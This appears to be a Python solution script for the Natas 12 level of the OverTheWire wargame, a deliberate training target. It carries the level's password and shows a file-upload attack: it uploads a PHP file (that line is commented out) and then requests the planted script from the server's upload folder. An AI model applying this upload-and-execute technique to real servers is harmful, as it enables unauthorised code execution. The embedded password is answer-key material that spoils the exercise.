import requests
import re #regular expressions

username = "natas12"
password = "EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng"

url = 'http://%s.natas.labs.overthewire.org/upload/hf4w8mp82j.php' % username
file = {"uploadedfile":open("Natas 12.php","rb")}
data = {"filename":"Natas 12.php"}

session = requests.Session() #Maintains a session
#response = session.post(url , auth=(username, password),files=file,data=data)
response = session.get(url, auth = (username,password))
content = response.text

print (content)
#print (re.findall("natas12 is (.*)<br>",content)[0])
